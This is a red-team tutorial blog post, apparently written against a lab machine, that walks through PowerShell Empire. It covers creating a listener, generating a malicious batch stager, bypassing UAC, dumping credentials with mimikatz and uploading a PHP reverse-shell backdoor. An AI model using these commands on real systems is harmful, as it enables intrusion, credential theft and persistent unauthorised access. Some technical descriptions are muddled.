<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/" rel="category tag">PowerShell Empire</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Hacking with Empire – PowerShell Post-Exploitation Agent</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/" rel="bookmark"><time class="entry-date published" datetime="2018-10-11T12:09:12+00:00">October 11, 2018</time><time class="updated" datetime="2025-05-15T17:52:06+00:00">May 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today’s article is the first post of our Empire series. In this, we will cover every basic you need to know about the PowerShell Empire Framework. And with the eventual, we study advanced exploits of Empire.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><strong><span style="color: #000000;">Introduction</span></strong></li>
<li><strong><span style="color: #000000;">Installation</span></strong></li>
<li><strong><span style="color: #000000;">Importance</span></strong></li>
<li><strong><span style="color: #000000;">Terminology</span></strong></li>
<li><strong><span style="color: #000000;">Demo</span></strong></li>
<li><strong><span style="color: #000000;">Conclusion</span></strong></li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><span style="color: #000000;">Empire is a post-exploitation framework. It’s a pure PowerShell agent, focused solely on Python with cryptographically-secure communications with the add-on of a flexible architecture. Empire has the means to execute PowerShell agents without the requirement of PowerShell.exe. It can promptly employ post-exploitable modules, which covers a vast range from ranging from keyloggers to Mimikatz, etc. This framework is a combination of the PowerShell Empire and Python Empire projects, which makes it user-friendly and convenient. PowerShell Empire came out in 2015, and Python Empire came out in 2016. It is similar to Metasploit and Meterpreter. But as it is a command and control tool, it allows you to control a PC much more efficiently.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Importance</span> </span></h3>
<p><span style="color: #000000;">PowerShell provides abundant offensive advantages which further includes the whole access of .NET, applock whitelisting, and straight access to Win32. It also constructs malicious binaries in memory. PowerShell provides C2 functionality and allows you to implant the second stage after the first one. It can also be used for lateral movement. And it comes handy as it develops rapidly in comparison to other frameworks. Also, as it does not requires PowerShell.exe, it lets you bypass anti-viruses. Hence, it is best to use the PowerShell Empire.</span></p>
<h3><span style="color: #800000;">Terminology</span></h3>
<p><span style="color: #000000;">Before starting with the action you need to know these four things:</span></p>
<ul>
<li><span style="color: #000000;"><strong>Listener: </strong>the listener is a process which listens for a connection from the machine we are attacking. This helps Empire send the loot back to the attacker’s computer.</span></li>
<li><span style="color: #000000;"><strong>Stager: </strong>A stager is a snippet of code that allows our malicious code to be run via the agent on the compromised host.</span></li>
<li><span style="color: #000000;"><strong>Agent: </strong>An agent is a program that maintains a connection between your computer and the compromised host.</span></li>
<li><span style="color: #000000;"><strong>Module: </strong>These are what execute our malicious commands, which can harvest credentials and escalate our privileges as mentioned above.</span></li>
</ul>
<h3><span style="color: #800000;">Installation</span></h3>
<p><span style="color: #000000;">You can download Empire from <a style="color: #000000;" href="//github.com/EmpireProject/Empire">here</a>. Clone the command from the hyperlink provided for GitHub or simply use google.</span></p>
<p><span style="color: #000000;">Use the following command to download it:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone //github.com/EmpireProject/Empire.git</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-kb0xPUsnfqo/XFLz_o6Mf7I/AAAAAAAAcf0/wdOcxDFNTlIElEv-QJI9J9LWnXARnb9rgCLcBGAs/s1600/1.png" alt="Hacking with Empire PowerShell" width="661" height="115"/></span></p>
<p><span style="color: #000000;">Once the downloaded is initiated and completed, follow steps given directly below in order to install it :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Empire/
ls
cd setup/
ls
./install.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-3kXsXeA4pC8/XFL0CS3XqiI/AAAAAAAAcgU/1pEeZTVaN4gO8KiPUw6NsR5KeLr1MCxkgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Wait for it to complete the installation. This might take a few seconds. It will prompt you for a password.</span></p>
<p><span style="color: #000000;">In my case, my password was <strong>toor.</strong></span></p>
<p><span style="color: #000000;">Once the installation is done, move back a directory and run empire using <strong>./empire.</strong></span></p>
<p><span style="color: #000000;">Now use <strong>Help </strong>command as it opens up all the essential options required initially.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-d8ni0QUi_m0/XFL0CclGrfI/AAAAAAAAcgc/s3WcR_3bBPobGFiJ--Dsf11dDpdf3focQCLcBGAs/s1600/3.png"/></span></p>
<h5 data-pm-slice="1 1 []"><strong><span style="color: #000000;">Creating a Listener</span></strong></h5>
<p><span style="color: #000000;">According to the workflow, firstly, we have to create a listener on our local machine. Type the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners</pre>
<p><span style="color: #000000;">After running the above command, it will say that “no listeners are currently active” but don’t worry, we are into the listener interface now.  So in this listener interface, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">uselistener &lt;tab&gt; &lt;tab&gt;</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" class="alignnone" src="//4.bp.blogspot.com/-_fTeY3Ywa-4/XFL0CYWLlsI/AAAAAAAAcgY/GgKrmDIlZUYxLqWbVZ4vDNvcnXHRl7vpgCLcBGAs/s1600/4.png" alt="Hacking with Empire PowerShell" width="969" height="361"/></strong></span></p>
<p><span style="color: #000000;">The above command will list all the listeners that one can use, such as dbx, http, http_com, etc. The most popular and commonly used listener is http and we will use the same in our practice. For that type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">uselistener http</pre>
<p><span style="color: #000000;">This command creates a listener on the local port 80. If port 80 is already busy by a service like Apache, please make sure you stop that service as this listener being http listener will only work on port 80. Now to see all the settings that you ought to provide in this listener type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">info</pre>
<p><span style="color: #000000;">As you can see in the image that there are a variety of settings you can use to modify or customize your listener. Let’s try changing the name of our listener as it helps to remember all the listeners that are activated; if activated in bulk. So for this, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set Name test</pre>
<p><span style="color: #000000;">The above command will change the listeners’ name from http to test.</span></p>
<h5 data-pm-slice="1 1 []"><span style="color: #000000;">Setting the IP Address</span></h5>
<p><span style="color: #000000;">Usually, this listener automatically takes up the local host IP but just in case, you can use the following command to set your IP :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set Host //192.168.1.107
execute</pre>
<p><span style="color: #000000;">Above command will execute the listener. Then go back and use the PowerShell listener as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-s4kEOLyRGRU/XFL0DIGP-cI/AAAAAAAAcgg/4GCAfOrW6YwzCrPTCm10ZDBOzG5ii5UCACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now type ‘back’ to go back from the listener interface so that we can execute our modules. Use the following command to see all the modules that the empire provides:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager &lt;tabt&gt; &lt;tab&gt;</pre>
<p><span style="color: #000000;">As you can see in the image below that there are a lot of modules for both windows and IOS along with some multi ones that can be used on any platforms. We will use launcher_bat to create malware and exploit our victims’ PC in our tutorial. And for that type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_bat</pre>
<p><span style="color: #000000;">Then again type ‘info’ in order to see all the settings required by the exploit. After examining you will see that we only need to provide listener. Therefore, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set Listener test
execute</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-8GC5G1v_KNU/XFL0Df6RNzI/AAAAAAAAcgo/l6aeNEIhzDIj2BQ0D0zOropqkZaU2kdeACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//3.bp.blogspot.com/-4Qz2ZCt3UYg/XFL0DUztQFI/AAAAAAAAcgk/k4Ia1WzLBHAQ0-fw0PhR1IVSlnIKz6nQgCLcBGAs/s1600/7.png" alt="Hacking with Empire PowerShell" width="932" height="728"/></span></p>
<p><span style="color: #000000;">The above two commands will execute our exploit after setting the listener test and create /tmp/launcher.bat. Use the python server to execute this file in victims’ PC. As the file will execute, you will have a session. To check your session type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">agents</pre>
<p><span style="color: #000000;">With the above command, you can see that you have a session activated. You can change the name of your session as the name given by default is pretty complicated and difficult to remember. To do so type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rename ZAF3GT5W raajpc</pre>
<p><span style="color: #000000;">Use the following to access the session:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact raajpc</pre>
<p><span style="color: #000000;">Once you have gained access to the session, try and get the admin session by using the following command:</span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">bypassuac http</span> </strong></span></h3>
<p><span style="color: #000000;">After executing the bypassuac command, another session will open. Rename that session too by typing :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rename HE3K45LN adminraj</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-VrhR5HZlCfc/XHFl-fEMcWI/AAAAAAAAc9w/i5fFxcowU6kMMA9zM_nlccTkmifEnWObwCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Let’s interact with adminraj now.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact adminraj</pre>
<p><span style="color: #000000;"><strong>&lt;tab&gt;&lt;tab&gt;</strong>helps us view all the options in the shell. There are several options which is quite helpful to for post exploitation. Such as info, job, list and etc as shown in the image.</span></p>
<p><span style="color: #000000;"><strong>Info: </strong>for all the basic details like IP, nonce, jitter, integrity etc.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-O0t-lLeLWGA/XFL0D1HiqJI/AAAAAAAAcgw/dFt5zhcL8nYj6NwZuLDQXSey8zdK_vLLgCLcBGAs/s1600/9.png" alt="Hacking with Empire PowerShell" width="763" height="829"/></span></p>
<p><span style="color: #000000;">Now if you use ‘help’ command, you will be able to see all the executable commands. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-xUQKlVc2ZLI/XFLz_hohXrI/AAAAAAAAcfs/u0J0YZMzJ3EKltz1KqhNzoXxYQbIHZ8HwCLcBGAs/s1600/10.1.png"/></span></p>
<p><span style="color: #000000;">Let’s try and run <strong>mimikatz</strong> to get the password of the user. Since <strong>mimikatz</strong> won’t run on a normal guest user shell and will only run on the admin shell; this also proves that we have to achieve admin access so that we can use mimikatz.</span></p>
<p><span style="color: #000000;">Hmmmm!! And the password is “123” for user raj.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-zRAujpU5H3k/XFLz_tAf41I/AAAAAAAAcfw/Z7cM7LKX08Uwj1nQ2hUQa2tcaUYyrOzywCLcBGAs/s1600/10.png" alt="Hacking with Empire PowerShell" width="785" height="861"/></span></p>
<h3><span style="color: #800000;"><strong>creds </strong></span></h3>
<p><span style="color: #000000;">The above command will dump the credentials or password of any user in both plaintext and its hash as well.</span></p>
<p><span style="color: #000000;">Another important command is the <strong>shell </strong>command.</span></p>
<p><span style="color: #000000;">To use the shell of the victim to run proper Microsoft windows commands, we use this feature.</span></p>
<p><span style="color: #000000;">Eg: one such window’s cmd only command is <strong>netstat</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell netstat -ano</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-mMorvsHGp8U/XFL0AA7UCxI/AAAAAAAAcf4/mTPLM73UgqkL3nDzC0CZOXKLGcuGuBaHwCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">And as expected, the above command showed us all the ports in use currently on the machine!</span></p>
<h5 data-pm-slice="1 1 []"><span style="color: #000000;"><strong>Navigating and File Transfer in Empire</strong></span></h5>
<p><span style="color: #000000;">Now, since the default shell directory in Windows is “<strong>C:/windows/system32</strong>. Let’s try and move into another directory and try to download some file from there, and also we can upload something at that location, for example, we can upload a backdoor! Now, use the following commands for it :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell cd C:\Users\raj\Desktop
shell dir
download 6.png</pre>
<p><span style="color: #000000;">The above command will download an image called 6.png from the Windows desktop to the “downloads directory of Empire”</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/Desktop/revshell.php</pre>
<p><span style="color: #000000;">Here we can upload any backdoor, with help of the above command we are uploading a php backdoor from Kali’s desktop to the victim’s desktop, and we can even invoke this file since we have the shell access!</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-X1s-YWC1Xj4/XFL0Ad6DoAI/AAAAAAAAcgA/Avx78M4YfiAXWq3h0n3ZdxK-OMZMqzPtQCLcBGAs/s1600/12.png" alt="Hacking with Empire PowerShell" width="724" height="933"/></span></p>
<p><span style="color: #000000;">This is where the downloaded files will go:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Empire directory/downloads/&lt;agent name&gt;/&lt;agent shell location&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-xcgY1gDBusQ/XFL0AVt1kQI/AAAAAAAAcf8/ypsDs9J7nPUFNPP6ZdL6NalmMyzPcfN-QCLcBGAs/s1600/13.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell dir</pre>
<p><span style="color: #000000;">Above command proves that we indeed have uploaded revshell.php</span></p>
<p><span style="color: #000000;">And there it is! Revshell.php on the desktop of victim’s machine which our backdoor file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-7AWWXjwfZDk/XFL0A4BNkcI/AAAAAAAAcgE/qhQR92UguCchbz1rgR486FutoET9lJZqwCLcBGAs/s1600/14.png"/></span></p>
<h5 data-pm-slice="1 1 []"><span style="color: #000000;">Using the usemodule Command</span></h5>
<p><span style="color: #000000;">Previously shown were the basic demo of empire and its different terms used and how to use them. There is another term too, i.e. usemodule. Lastly, let’s see how to use it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule &lt;tab&gt; &lt;tab&gt;</pre>
<p><span style="color: #000000;">The command will show you all the modules available and ready to use as shown in the image below:</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-aOtqoWHNG8s/XFL0BTFzhdI/AAAAAAAAcgI/S-WzclFtJucehgAvb1hlmtbzqC_n0itUACLcBGAs/s1600/15.png" alt="Hacking with Empire PowerShell" width="1047" height="730"/></span></p>
<p><span style="color: #000000;">Following is a small demo of how to use usemodule. Type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule trollsploit/message
set MsgText you have been hacked
execute
y</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-6IbGGv3fPhs/XFL0BjvFu3I/AAAAAAAAcgM/S4fj_0ifqQA_Z6lDyXhWWMcK4gTCOiQaACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Using the above module will display a message on victims’ PC as shown image below :</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/--t6ETMHrT1c/XFL0B4_4W1I/AAAAAAAAcgQ/C6zgUrEZyW8T8hp1HO_HopvLfOoi_SSAACLcBGAs/s1600/17.png" alt="Hacking with Empire PowerShell" width="494" height="267"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">Malware in the form of .exe/dll/hta etc. allows an attacker to construct any desirable attack as this framework has access to Win32. Although anti-virus companies are becoming aware day by day, these ones are still valid. It’s a great tool due to its vast, authentic and efficient collection of post-exploits. Ultimately, the goal is to be undetected and successful in your attack and this tool allows us to do so. And this article covered all the basics you need to know about this framework.</span></p>
<p><span style="color: #000000;">Happy Hacking!!</span></p>
<p><span style="color: #000000;">To learn more about PowerShell. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="//in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
